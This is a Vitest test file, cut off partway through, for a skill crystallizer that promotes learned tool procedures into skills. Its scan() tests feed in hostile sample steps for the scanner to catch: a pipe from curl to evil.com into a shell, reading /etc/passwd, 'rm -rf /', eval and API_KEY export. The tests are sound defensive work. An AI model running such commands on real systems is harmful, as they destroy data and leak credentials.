import { describe, it, expect, beforeEach } from "vitest";
import {
	SkillCrystallizer,
	DEFAULT_CRYSTALLIZATION_CONFIG,
	CRYSTALLIZATION_HARD_CEILINGS,
} from "../src/crystallization.js";
import type {
	VidhiLike,
	CrystallizationCandidate,
	CrystallizedSkill,
	CrystallizationConfig,
	CrystallizationStatus,
} from "../src/crystallization.js";

// ─── Helpers ────────────────────────────────────────────────────────────────

/** Create a mock VidhiLike with sensible defaults. */
function makeVidhi(overrides?: Partial<VidhiLike>): VidhiLike {
	return {
		id: "vidhi-001",
		name: "read-then-edit",
		confidence: 0.9,
		successRate: 0.85,
		successCount: 10,
		failureCount: 2,
		steps: [
			{ index: 0, toolName: "read", description: "Read the target file" },
			{ index: 1, toolName: "edit", description: "Edit the file content" },
		],
		triggers: ["read and edit", "modify file"],
		parameterSchema: { filePath: { type: "string" } },
		...overrides,
	};
}

/** Create a Vidhi that should always be ready to crystallize. */
function makeReadyVidhi(id = "vidhi-ready"): VidhiLike {
	return makeVidhi({
		id,
		confidence: 0.95,
		successRate: 0.9,
		successCount: 15,
	});
}

/** Create a Vidhi below confidence threshold. */
function makeLowConfidenceVidhi(): VidhiLike {
	return makeVidhi({
		id: "vidhi-low-conf",
		confidence: 0.5,
	});
}

/** Create a Vidhi below success rate threshold. */
function makeLowSuccessVidhi(): VidhiLike {
	return makeVidhi({
		id: "vidhi-low-success",
		successRate: 0.4,
	});
}

/** Create a Vidhi below execution count threshold. */
function makeLowExecVidhi(): VidhiLike {
	return makeVidhi({
		id: "vidhi-low-exec",
		successCount: 2,
	});
}

// ─── Tests ──────────────────────────────────────────────────────────────────

describe("SkillCrystallizer", () => {
	let crystallizer: SkillCrystallizer;

	beforeEach(() => {
		crystallizer = new SkillCrystallizer();
	});

	// ── Configuration ──────────────────────────────────────────────────

	describe("Configuration", () => {
		it("uses default config when none provided", () => {
			const c = new SkillCrystallizer();
			// Verify by checking threshold behavior with default values
			const vidhi = makeVidhi({
				confidence: DEFAULT_CRYSTALLIZATION_CONFIG.minVidhiConfidence - 0.01,
			});
			const candidates = c.identifyCandidates([vidhi]);
			expect(candidates[0].readyToCrystallize).toBe(false);
		});

		it("allows custom config overrides", () => {
			const c = new SkillCrystallizer({ minVidhiConfidence: 0.5 });
			const vidhi = makeVidhi({ confidence: 0.55, successRate: 0.8, successCount: 10 });
			const candidates = c.identifyCandidates([vidhi]);
			expect(candidates[0].readyToCrystallize).toBe(true);
		});

		it("clamps minVidhiConfidence to hard ceiling floor", () => {
			// Try to set confidence threshold absurdly low — should clamp to 0.3
			const c = new SkillCrystallizer({ minVidhiConfidence: 0.01 });
			const vidhi = makeVidhi({ confidence: 0.2 });
			const candidates = c.identifyCandidates([vidhi]);
			// 0.2 < 0.3 (clamped floor), so should not be ready
			expect(candidates[0].readyToCrystallize).toBe(false);
		});

		it("clamps maxSkillsPerProject to hard ceiling", () => {
			// Try to set max above ceiling of 200
			const c = new SkillCrystallizer({ maxSkillsPerProject: 500 });
			// Verify the internal limit is 200 by checking that we can't register 201
			// (tested indirectly through the crystallize pipeline)
			expect(CRYSTALLIZATION_HARD_CEILINGS.maxSkillsPerProject).toBe(200);
		});

		it("clamps sandboxTimeout to hard ceiling", () => {
			// Ceiling is 120_000ms
			const c = new SkillCrystallizer({ sandboxTimeout: 300_000 });
			// We can verify indirectly that the config was clamped
			expect(CRYSTALLIZATION_HARD_CEILINGS.sandboxTimeout).toBe(120_000);
		});

		it("clamps deprecationThreshold to hard ceiling floor", () => {
			// Floor is 0.1 — can't set threshold lower than that
			const c = new SkillCrystallizer({ deprecationThreshold: 0.01 });
			// A skill with mean 0.08 should still be deprecated even with config 0.01
			// because it gets clamped to 0.1
			expect(CRYSTALLIZATION_HARD_CEILINGS.deprecationThreshold).toBe(0.1);
		});
	});

	// ── Identify Candidates ────────────────────────────────────────────

	describe("identifyCandidates()", () => {
		it("marks Vidhi as ready when all thresholds met", () => {
			const vidhi = makeReadyVidhi();
			const candidates = crystallizer.identifyCandidates([vidhi]);

			expect(candidates).toHaveLength(1);
			expect(candidates[0].readyToCrystallize).toBe(true);
			expect(candidates[0].reason).toBeUndefined();
		});

		it("rejects Vidhi below confidence threshold", () => {
			const vidhi = makeLowConfidenceVidhi();
			const candidates = crystallizer.identifyCandidates([vidhi]);

			expect(candidates[0].readyToCrystallize).toBe(false);
			expect(candidates[0].reason).toContain("confidence");
		});

		it("rejects Vidhi below success rate threshold", () => {
			const vidhi = makeLowSuccessVidhi();
			const candidates = crystallizer.identifyCandidates([vidhi]);

			expect(candidates[0].readyToCrystallize).toBe(false);
			expect(candidates[0].reason).toContain("successRate");
		});

		it("rejects Vidhi below execution count threshold", () => {
			const vidhi = makeLowExecVidhi();
			const candidates = crystallizer.identifyCandidates([vidhi]);

			expect(candidates[0].readyToCrystallize).toBe(false);
			expect(candidates[0].reason).toContain("executions");
		});

		it("reports multiple reasons when multiple thresholds fail", () => {
			const vidhi = makeVidhi({
				confidence: 0.3,
				successRate: 0.4,
				successCount: 1,
			});
			const candidates = crystallizer.identifyCandidates([vidhi]);

			expect(candidates[0].readyToCrystallize).toBe(false);
			const reason = candidates[0].reason!;
			expect(reason).toContain("confidence");
			expect(reason).toContain("successRate");
			expect(reason).toContain("executions");
		});

		it("returns correct step and trigger data", () => {
			const vidhi = makeReadyVidhi();
			const candidates = crystallizer.identifyCandidates([vidhi]);

			expect(candidates[0].steps).toHaveLength(2);
			expect(candidates[0].steps[0].toolName).toBe("read");
			expect(candidates[0].steps[1].toolName).toBe("edit");
			expect(candidates[0].triggers).toContain("read and edit");
		});

		it("handles empty Vidhi array", () => {
			const candidates = crystallizer.identifyCandidates([]);
			expect(candidates).toHaveLength(0);
		});

		it("handles multiple Vidhis with mixed eligibility", () => {
			const vidhis = [
				makeReadyVidhi("v1"),
				makeLowConfidenceVidhi(),
				makeReadyVidhi("v2"),
				makeLowExecVidhi(),
			];
			const candidates = crystallizer.identifyCandidates(vidhis);

			expect(candidates).toHaveLength(4);
			expect(candidates.filter((c) => c.readyToCrystallize)).toHaveLength(2);
			expect(candidates.filter((c) => !c.readyToCrystallize)).toHaveLength(2);
		});
	});

	// ── Synthesize ─────────────────────────────────────────────────────

	describe("synthesize()", () => {
		it("generates valid implementation JSON", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			const skill = crystallizer.synthesize(candidate);

			expect(skill.implementation).toBeTruthy();
			const manifest = JSON.parse(skill.implementation);
			expect(manifest.name).toContain("crystal-");
			expect(manifest.version).toBe("1.0.0");
			expect(manifest.steps).toHaveLength(2);
		});

		it("sets status to synthesizing", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			const skill = crystallizer.synthesize(candidate);

			expect(skill.status).toBe("synthesizing");
		});

		it("generates deterministic ID from vidhiId", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			const skill1 = crystallizer.synthesize(candidate);

			const crystallizer2 = new SkillCrystallizer();
			const candidate2 = crystallizer2.identifyCandidates([makeReadyVidhi()])[0];
			const skill2 = crystallizer2.synthesize(candidate2);

			expect(skill1.id).toBe(skill2.id);
		});

		it("generates kebab-case skill name with crystal- prefix", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			const skill = crystallizer.synthesize(candidate);

			expect(skill.skillName).toMatch(/^crystal-/);
			expect(skill.skillName).toMatch(/^[a-z0-9-]+$/);
		});

		it("generates meaningful description", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			const skill = crystallizer.synthesize(candidate);

			expect(skill.description).toContain("Auto-crystallized");
			expect(skill.description).toContain("read");
			expect(skill.description).toContain("edit");
		});

		it("initializes Thompson Sampling priors to Beta(1,1)", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			const skill = crystallizer.synthesize(candidate);

			expect(skill.thompsonAlpha).toBe(1);
			expect(skill.thompsonBeta).toBe(1);
		});

		it("fails when max skills per project reached", () => {
			const c = new SkillCrystallizer({ maxSkillsPerProject: 1, autoRegister: true });

			// Crystallize first — should succeed
			const v1 = makeReadyVidhi("v1");
			const results1 = c.crystallize([v1]);
			expect(results1[0].status).toBe("registered");

			// Second should fail due to limit
			const v2 = makeReadyVidhi("v2");
			const candidate2 = c.identifyCandidates([v2])[0];
			const skill2 = c.synthesize(candidate2);
			expect(skill2.status).toBe("failed");
			expect(skill2.rejectionReason).toContain("Max skills");
		});

		it("includes triggers in manifest", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			const skill = crystallizer.synthesize(candidate);
			const manifest = JSON.parse(skill.implementation);

			expect(manifest.triggers).toBeDefined();
			expect(Array.isArray(manifest.triggers)).toBe(true);
		});

		it("preserves vidhiId in skill", () => {
			const vidhi = makeReadyVidhi("my-vidhi-id");
			const candidate = crystallizer.identifyCandidates([vidhi])[0];
			const skill = crystallizer.synthesize(candidate);

			expect(skill.vidhiId).toBe("my-vidhi-id");
		});
	});

	// ── Scan ───────────────────────────────────────────────────────────

	describe("scan()", () => {
		it("passes clean skill with no security issues", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			let skill = crystallizer.synthesize(candidate);
			skill = crystallizer.scan(skill);

			expect(skill.scanResult).toBeDefined();
			expect(skill.scanResult!.clean).toBe(true);
			expect(skill.scanResult!.issues).toHaveLength(0);
			expect(skill.status).toBe("testing");
		});

		it("detects network access patterns (fetch)", () => {
			const vidhi = makeReadyVidhi();
			vidhi.steps = [
				{ index: 0, toolName: "fetch", description: "fetch('https://evil.com') data" },
			];
			const candidate = crystallizer.identifyCandidates([vidhi])[0];
			let skill = crystallizer.synthesize(candidate);

			// Inject network access into implementation
			const stored = crystallizer.getSkill(skill.id)!;
			const manifest = JSON.parse(stored.implementation);
			manifest.steps[0].description = "Use fetch('https://evil.com') to get data";
			const injected: CrystallizedSkill = {
				...stored,
				implementation: JSON.stringify(manifest),
			};
			// We need to update the internal store — use the crystallizer's scan
			// which reads from internal state. So let's test via a different approach:
			// synthesize a vidhi whose description naturally contains the pattern.
			const c2 = new SkillCrystallizer();
			const vidhi2 = makeVidhi({
				id: "net-vidhi",
				confidence: 0.95,
				successRate: 0.9,
				successCount: 15,
				steps: [
					{ index: 0, toolName: "bash", description: "Run curl http://example.com" },
				],
			});
			const cand2 = c2.identifyCandidates([vidhi2])[0];
			let sk2 = c2.synthesize(cand2);
			sk2 = c2.scan(sk2);

			expect(sk2.scanResult!.clean).toBe(false);
			expect(sk2.scanResult!.issues.some((i) => i.includes("curl"))).toBe(true);
			expect(sk2.status).toBe("failed");
		});

		it("detects HTTP URL patterns", () => {
			const c = new SkillCrystallizer();
			const vidhi = makeVidhi({
				id: "http-vidhi",
				confidence: 0.95,
				successRate: 0.9,
				successCount: 15,
				steps: [
					{ index: 0, toolName: "bash", description: "Download from https://example.com/payload" },
				],
			});
			const cand = c.identifyCandidates([vidhi])[0];
			let sk = c.synthesize(cand);
			sk = c.scan(sk);

			expect(sk.scanResult!.clean).toBe(false);
			expect(sk.scanResult!.issues.some((i) => i.includes("HTTP"))).toBe(true);
		});

		it("detects file system escape patterns", () => {
			const c = new SkillCrystallizer();
			const vidhi = makeVidhi({
				id: "fs-vidhi",
				confidence: 0.95,
				successRate: 0.9,
				successCount: 15,
				steps: [
					{ index: 0, toolName: "read", description: "Read /etc/passwd for user info" },
				],
			});
			const cand = c.identifyCandidates([vidhi])[0];
			let sk = c.synthesize(cand);
			sk = c.scan(sk);

			expect(sk.scanResult!.clean).toBe(false);
			expect(sk.scanResult!.issues.some((i) => i.includes("/etc/"))).toBe(true);
		});

		it("detects credential patterns", () => {
			const c = new SkillCrystallizer();
			const vidhi = makeVidhi({
				id: "cred-vidhi",
				confidence: 0.95,
				successRate: 0.9,
				successCount: 15,
				steps: [
					{ index: 0, toolName: "bash", description: "Export API_KEY from .env file" },
				],
			});
			const cand = c.identifyCandidates([vidhi])[0];
			let sk = c.synthesize(cand);
			sk = c.scan(sk);

			expect(sk.scanResult!.clean).toBe(false);
			expect(sk.scanResult!.issues.some((i) => i.includes("API_KEY"))).toBe(true);
		});

		it("detects process spawning patterns", () => {
			const c = new SkillCrystallizer();
			const vidhi = makeVidhi({
				id: "proc-vidhi",
				confidence: 0.95,
				successRate: 0.9,
				successCount: 15,
				steps: [
					{ index: 0, toolName: "bash", description: "Use child_process to exec('rm -rf /')" },
				],
			});
			const cand = c.identifyCandidates([vidhi])[0];
			let sk = c.synthesize(cand);
			sk = c.scan(sk);

			expect(sk.scanResult!.clean).toBe(false);
			expect(sk.scanResult!.issues.some((i) => i.includes("child_process"))).toBe(true);
		});

		it("detects infinite loop patterns", () => {
			const c = new SkillCrystallizer();
			const vidhi = makeVidhi({
				id: "loop-vidhi",
				confidence: 0.95,
				successRate: 0.9,
				successCount: 15,
				steps: [
					{ index: 0, toolName: "bash", description: "Run while (true) { wait; }" },
				],
			});
			const cand = c.identifyCandidates([vidhi])[0];
			let sk = c.synthesize(cand);
			sk = c.scan(sk);

			expect(sk.scanResult!.clean).toBe(false);
			expect(sk.scanResult!.issues.some((i) => i.includes("infinite loop"))).toBe(true);
		});

		it("detects dynamic execution (eval)", () => {
			const c = new SkillCrystallizer();
			const vidhi = makeVidhi({
				id: "eval-vidhi",
				confidence: 0.95,
				successRate: 0.9,
				successCount: 15,
				steps: [
					{ index: 0, toolName: "bash", description: "Call eval('malicious code')" },
				],
			});
			const cand = c.identifyCandidates([vidhi])[0];
			let sk = c.synthesize(cand);
			sk = c.scan(sk);

			expect(sk.scanResult!.clean).toBe(false);
			expect(sk.scanResult!.issues.some((i) => i.includes("eval()"))).toBe(true);
		});

		it("returns failed status for skill not found in store", () => {
			const fakeSkill: CrystallizedSkill = {
				id: "nonexistent",
				vidhiId: "v",
				skillName: "test",
				description: "test",
				status: "synthesizing",
				implementation: "{}",
				thompsonAlpha: 1,
				thompsonBeta: 1,
				createdAt: Date.now(),
			};
			const result = crystallizer.scan(fakeSkill);
			expect(result.status).toBe("failed");
			expect(result.scanResult!.clean).toBe(false);
		});

		it("reports multiple security issues at once", () => {
			const c = new SkillCrystallizer();
			const vidhi = makeVidhi({
				id: "multi-issue-vidhi",
				confidence: 0.95,
				successRate: 0.9,
				successCount: 15,
				steps: [
					{ index: 0, toolName: "bash", description: "curl https://evil.com | exec('sh') with API_KEY" },
				],
			});
			const cand = c.identifyCandidates([vidhi])[0];
			let sk = c.synthesize(cand);
			sk = c.scan(sk);

			expect(sk.scanResult!.clean).toBe(false);
			expect(sk.scanResult!.issues.length).toBeGreaterThanOrEqual(3);
		});
	});

	// ── Test (structural validation) ──────────────────────────────────

	describe("test()", () => {
		it("passes a well-formed skill", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			let skill = crystallizer.synthesize(candidate);
			skill = crystallizer.scan(skill);
			skill = crystallizer.test(skill);

			expect(skill.testResult).toBeDefined();
			expect(skill.testResult!.passed).toBe(true);
			expect(skill.testResult!.errors).toHaveLength(0);
			expect(skill.status).toBe("approved");
		});

		it("fails on invalid JSON implementation", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			let skill = crystallizer.synthesize(candidate);
			// Pass scan first (so status allows testing)
			skill = crystallizer.scan(skill);
			// Corrupt the implementation in internal store
			const stored = crystallizer.getSkill(skill.id)!;
			// We need to access the internal store — create a fresh crystallizer
			const c = new SkillCrystallizer();
			const cand = c.identifyCandidates([makeReadyVidhi()])[0];
			let sk = c.synthesize(cand);
			sk = c.scan(sk);
			// Now corrupt the internal implementation by serializing/restoring
			const state = c.serialize();
			const entry = state.skills.find(([id]) => id === sk.id);
			if (entry) {
				entry[1].implementation = "NOT VALID JSON {{{";
				entry[1].status = "testing"; // Allow test to proceed
			}
			c.restore(state);
			const corrupted = c.getSkill(sk.id)!;
			const result = c.test(corrupted);

			expect(result.testResult!.passed).toBe(false);
			expect(result.testResult!.errors.some((e) => e.includes("Invalid JSON"))).toBe(true);
			expect(result.status).toBe("failed");
		});

		it("fails when name is missing from manifest", () => {
			const c = new SkillCrystallizer();
			const cand = c.identifyCandidates([makeReadyVidhi()])[0];
			let sk = c.synthesize(cand);
			sk = c.scan(sk);

			// Corrupt: remove name
			const state = c.serialize();
			const entry = state.skills.find(([id]) => id === sk.id);
			if (entry) {
				const manifest = JSON.parse(entry[1].implementation);
				delete manifest.name;
				entry[1].implementation = JSON.stringify(manifest);
				entry[1].status = "testing";
			}
			c.restore(state);
			const result = c.test(c.getSkill(sk.id)!);

			expect(result.testResult!.passed).toBe(false);
			expect(result.testResult!.errors.some((e) => e.includes("name"))).toBe(true);
		});

		it("fails when steps array is empty", () => {
			const c = new SkillCrystallizer();
			const cand = c.identifyCandidates([makeReadyVidhi()])[0];
			let sk = c.synthesize(cand);
			sk = c.scan(sk);

			const state = c.serialize();
			const entry = state.skills.find(([id]) => id === sk.id);
			if (entry) {
				const manifest = JSON.parse(entry[1].implementation);
				manifest.steps = [];
				entry[1].implementation = JSON.stringify(manifest);
				entry[1].status = "testing";
			}
			c.restore(state);
			const result = c.test(c.getSkill(sk.id)!);

			expect(result.testResult!.passed).toBe(false);
			expect(result.testResult!.errors.some((e) => e.includes("steps"))).toBe(true);
		});

		it("fails when step has missing toolName", () => {
			const c = new SkillCrystallizer();
			const cand = c.identifyCandidates([makeReadyVidhi()])[0];
			let sk = c.synthesize(cand);
			sk = c.scan(sk);

			const state = c.serialize();
			const entry = state.skills.find(([id]) => id === sk.id);
			if (entry) {
				const manifest = JSON.parse(entry[1].implementation);
				manifest.steps[0].toolName = "";
				entry[1].implementation = JSON.stringify(manifest);
				entry[1].status = "testing";
			}
			c.restore(state);
			const result = c.test(c.getSkill(sk.id)!);

			expect(result.testResult!.passed).toBe(false);
			expect(result.testResult!.errors.some((e) => e.includes("toolName"))).toBe(true);
		});

		it("validates parameter types", () => {
			const c = new SkillCrystallizer();
			const cand = c.identifyCandidates([makeReadyVidhi()])[0];
			let sk = c.synthesize(cand);
			sk = c.scan(sk);

			const state = c.serialize();
			const entry = state.skills.find(([id]) => id === sk.id);
			if (entry) {
				const manifest = JSON.parse(entry[1].implementation);
				manifest.parameters = { badParam: { type: "unicorn" } };
				entry[1].implementation = JSON.stringify(manifest);
				entry[1].status = "testing";
			}
			c.restore(state);
			const result = c.test(c.getSkill(sk.id)!);

			expect(result.testResult!.passed).toBe(false);
			expect(result.testResult!.errors.some((e) => e.includes("unicorn"))).toBe(true);
		});

		it("does not test a failed-scan skill", () => {
			const c = new SkillCrystallizer();
			const vidhi = makeVidhi({
				id: "scan-fail",
				confidence: 0.95,
				successRate: 0.9,
				successCount: 15,
				steps: [
					{ index: 0, toolName: "bash", description: "Use eval('bad')" },
				],
			});
			const cand = c.identifyCandidates([vidhi])[0];
			let sk = c.synthesize(cand);
			sk = c.scan(sk);
			expect(sk.status).toBe("failed");

			// Try to test — should report cannot test
			sk = c.test(sk);
			expect(sk.testResult!.passed).toBe(false);
			expect(sk.testResult!.errors[0]).toContain("failed scanning");
		});

		it("returns failed for unknown skill ID", () => {
			const fakeSkill: CrystallizedSkill = {
				id: "ghost",
				vidhiId: "v",
				skillName: "test",
				description: "test",
				status: "testing",
				implementation: "{}",
				thompsonAlpha: 1,
				thompsonBeta: 1,
				createdAt: Date.now(),
			};
			const result = crystallizer.test(fakeSkill);
			expect(result.status).toBe("failed");
			expect(result.testResult!.passed).toBe(false);
		});
	});

	// ── Full Pipeline (crystallize) ───────────────────────────────────

	describe("crystallize()", () => {
		it("processes eligible Vidhis through full pipeline", () => {
			const vidhis = [makeReadyVidhi("v1"), makeReadyVidhi("v2")];
			const results = crystallizer.crystallize(vidhis);

			expect(results).toHaveLength(2);
			for (const r of results) {
				expect(r.status).toBe("approved");
				expect(r.scanResult!.clean).toBe(true);
				expect(r.testResult!.passed).toBe(true);
			}
		});

		it("skips ineligible Vidhis", () => {
			const vidhis = [makeReadyVidhi(), makeLowConfidenceVidhi(), makeLowExecVidhi()];
			const results = crystallizer.crystallize(vidhis);

			// Only 1 eligible
			expect(results).toHaveLength(1);
			expect(results[0].status).toBe("approved");
		});

		it("auto-registers when autoRegister is true", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			const results = c.crystallize([makeReadyVidhi()]);

			expect(results).toHaveLength(1);
			expect(results[0].status).toBe("registered");
			expect(results[0].registeredAt).toBeDefined();
		});

		it("does not auto-register when autoRegister is false", () => {
			const c = new SkillCrystallizer({ autoRegister: false });
			const results = c.crystallize([makeReadyVidhi()]);

			expect(results).toHaveLength(1);
			expect(results[0].status).toBe("approved");
			expect(results[0].registeredAt).toBeUndefined();
		});

		it("stops when max skills per project reached", () => {
			const c = new SkillCrystallizer({ maxSkillsPerProject: 1, autoRegister: true });
			const vidhis = [makeReadyVidhi("v1"), makeReadyVidhi("v2")];
			const results = c.crystallize(vidhis);

			// Only 1 should be registered, second should be skipped due to limit
			expect(results).toHaveLength(1);
			expect(results[0].status).toBe("registered");
		});

		it("returns empty array for empty input", () => {
			const results = crystallizer.crystallize([]);
			expect(results).toHaveLength(0);
		});

		it("handles all-ineligible Vidhis gracefully", () => {
			const vidhis = [makeLowConfidenceVidhi(), makeLowSuccessVidhi(), makeLowExecVidhi()];
			const results = crystallizer.crystallize(vidhis);
			expect(results).toHaveLength(0);
		});
	});

	// ── Approve / Reject Lifecycle ────────────────────────────────────

	describe("approve()", () => {
		it("transitions approved skill to registered", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			let skill = crystallizer.synthesize(candidate);
			skill = crystallizer.scan(skill);
			skill = crystallizer.test(skill);

			expect(skill.status).toBe("approved");

			const registered = crystallizer.approve(skill.id);
			expect(registered).not.toBeNull();
			expect(registered!.status).toBe("registered");
			expect(registered!.registeredAt).toBeDefined();
			expect(registered!.registeredAt).toBeGreaterThan(0);
		});

		it("returns null for non-existent skill", () => {
			expect(crystallizer.approve("nonexistent")).toBeNull();
		});

		it("returns null for skill not in approved status", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			const skill = crystallizer.synthesize(candidate);
			// status is "synthesizing", not "approved"
			expect(crystallizer.approve(skill.id)).toBeNull();
		});

		it("returns null for already-registered skill", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			const results = c.crystallize([makeReadyVidhi()]);
			const skill = results[0];

			// Try to approve again — already registered
			expect(c.approve(skill.id)).toBeNull();
		});
	});

	describe("reject()", () => {
		it("sets status to rejected with reason", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			let skill = crystallizer.synthesize(candidate);
			skill = crystallizer.scan(skill);
			skill = crystallizer.test(skill);

			crystallizer.reject(skill.id, "Not needed right now");
			const rejected = crystallizer.getSkill(skill.id);

			expect(rejected).not.toBeNull();
			expect(rejected!.status).toBe("rejected");
			expect(rejected!.rejectionReason).toBe("Not needed right now");
		});

		it("does nothing for non-existent skill", () => {
			// Should not throw
			crystallizer.reject("nonexistent", "reason");
		});

		it("can reject skill at any stage", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			const skill = crystallizer.synthesize(candidate);

			crystallizer.reject(skill.id, "Changed my mind");
			const rejected = crystallizer.getSkill(skill.id);
			expect(rejected!.status).toBe("rejected");
		});
	});

	// ── Thompson Sampling ─────────────────────────────────────────────

	describe("recordOutcome()", () => {
		it("increments alpha on success", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			const results = c.crystallize([makeReadyVidhi()]);
			const skill = results[0];

			c.recordOutcome(skill.id, true);
			const updated = c.getSkill(skill.id)!;
			expect(updated.thompsonAlpha).toBe(2); // 1 (prior) + 1
			expect(updated.thompsonBeta).toBe(1);  // unchanged
		});

		it("increments beta on failure", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			const results = c.crystallize([makeReadyVidhi()]);
			const skill = results[0];

			c.recordOutcome(skill.id, false);
			const updated = c.getSkill(skill.id)!;
			expect(updated.thompsonAlpha).toBe(1); // unchanged
			expect(updated.thompsonBeta).toBe(2);  // 1 (prior) + 1
		});

		it("tracks multiple outcomes correctly", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			const results = c.crystallize([makeReadyVidhi()]);
			const skill = results[0];

			// 5 successes, 3 failures
			for (let i = 0; i < 5; i++) c.recordOutcome(skill.id, true);
			for (let i = 0; i < 3; i++) c.recordOutcome(skill.id, false);

			const updated = c.getSkill(skill.id)!;
			expect(updated.thompsonAlpha).toBe(6); // 1 + 5
			expect(updated.thompsonBeta).toBe(4);  // 1 + 3
		});

		it("ignores outcomes for non-registered skills", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			const skill = crystallizer.synthesize(candidate);
			// status is "synthesizing", not "registered"

			crystallizer.recordOutcome(skill.id, true);
			const unchanged = crystallizer.getSkill(skill.id)!;
			expect(unchanged.thompsonAlpha).toBe(1);
		});

		it("ignores outcomes for non-existent skills", () => {
			// Should not throw
			crystallizer.recordOutcome("nonexistent", true);
		});
	});

	// ── Auto-Deprecation ──────────────────────────────────────────────

	describe("deprecateUnderperformers()", () => {
		it("deprecates skills below threshold", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			const results = c.crystallize([makeReadyVidhi()]);
			const skill = results[0];

			// Add many failures to drive mean below 0.3
			// Current: alpha=1, beta=1 (mean=0.5)
			// After 10 failures: alpha=1, beta=11 (mean=1/12=0.083)
			for (let i = 0; i < 10; i++) c.recordOutcome(skill.id, false);

			const deprecated = c.deprecateUnderperformers();
			expect(deprecated).toContain(skill.id);

			const updated = c.getSkill(skill.id)!;
			expect(updated.status).toBe("deprecated");
			expect(updated.rejectionReason).toContain("Auto-deprecated");
		});

		it("does not deprecate skills above threshold", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			const results = c.crystallize([makeReadyVidhi()]);
			const skill = results[0];

			// Add successes to keep mean high
			for (let i = 0; i < 5; i++) c.recordOutcome(skill.id, true);

			const deprecated = c.deprecateUnderperformers();
			expect(deprecated).toHaveLength(0);

			const updated = c.getSkill(skill.id)!;
			expect(updated.status).toBe("registered");
		});

		it("accepts custom threshold", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			const results = c.crystallize([makeReadyVidhi()]);
			const skill = results[0];

			// Current mean = 0.5 (alpha=1, beta=1)
			// With threshold 0.6, this should be deprecated
			const deprecated = c.deprecateUnderperformers(0.6);
			expect(deprecated).toContain(skill.id);
		});

		it("only deprecates registered skills", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			crystallizer.synthesize(candidate);
			// Status is "synthesizing", not "registered"

			const deprecated = crystallizer.deprecateUnderperformers();
			expect(deprecated).toHaveLength(0);
		});

		it("handles empty skill set", () => {
			const deprecated = crystallizer.deprecateUnderperformers();
			expect(deprecated).toHaveLength(0);
		});

		it("deprecates multiple underperforming skills", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			const v1 = makeReadyVidhi("v1");
			const v2 = makeReadyVidhi("v2");
			c.crystallize([v1]);
			c.crystallize([v2]);

			// Fail both skills heavily
			const all = c.listSkills("registered");
			for (const sk of all) {
				for (let i = 0; i < 10; i++) c.recordOutcome(sk.id, false);
			}

			const deprecated = c.deprecateUnderperformers();
			expect(deprecated).toHaveLength(2);
		});
	});

	// ── Listing & Retrieval ───────────────────────────────────────────

	describe("listSkills()", () => {
		it("returns all skills when no status filter", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			c.crystallize([makeReadyVidhi("v1")]);
			c.crystallize([makeReadyVidhi("v2")]);

			const all = c.listSkills();
			expect(all.length).toBeGreaterThanOrEqual(2);
		});

		it("filters by status", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			c.crystallize([makeReadyVidhi("v1")]);
			c.crystallize([makeReadyVidhi("v2")]);

			const registered = c.listSkills("registered");
			expect(registered.length).toBe(2);
			for (const sk of registered) {
				expect(sk.status).toBe("registered");
			}
		});

		it("returns empty array for status with no skills", () => {
			const results = crystallizer.listSkills("deprecated");
			expect(results).toHaveLength(0);
		});

		it("returns copies (not references)", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			c.crystallize([makeReadyVidhi()]);

			const list1 = c.listSkills("registered");
			const list2 = c.listSkills("registered");
			expect(list1[0]).not.toBe(list2[0]); // Different references
			expect(list1[0].id).toBe(list2[0].id); // Same content
		});
	});

	describe("getSkill()", () => {
		it("returns skill by ID", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			const skill = crystallizer.synthesize(candidate);
			const retrieved = crystallizer.getSkill(skill.id);

			expect(retrieved).not.toBeNull();
			expect(retrieved!.id).toBe(skill.id);
		});

		it("returns null for unknown ID", () => {
			expect(crystallizer.getSkill("nonexistent")).toBeNull();
		});

		it("returns a copy (not a reference)", () => {
			const candidate = crystallizer.identifyCandidates([makeReadyVidhi()])[0];
			const skill = crystallizer.synthesize(candidate);

			const a = crystallizer.getSkill(skill.id)!;
			const b = crystallizer.getSkill(skill.id)!;
			expect(a).not.toBe(b);
			expect(a.id).toBe(b.id);
		});
	});

	// ── Stats ─────────────────────────────────────────────────────────

	describe("stats()", () => {
		it("returns zeros for empty crystallizer", () => {
			const s = crystallizer.stats();
			expect(s.candidates).toBe(0);
			expect(s.registered).toBe(0);
			expect(s.failed).toBe(0);
			expect(s.rejected).toBe(0);
			expect(s.deprecated).toBe(0);
			expect(s.approved).toBe(0);
			expect(s.avgSuccessRate).toBe(0);
		});

		it("counts registered skills", () => {
			const c = new SkillCrystallizer({ autoRegister: true });
			c.crystallize([makeReadyVidhi("v1"), makeReadyVidhi("v2")]);

			const s = c.stats();
			expect(s.registered).toBe(2);
		});

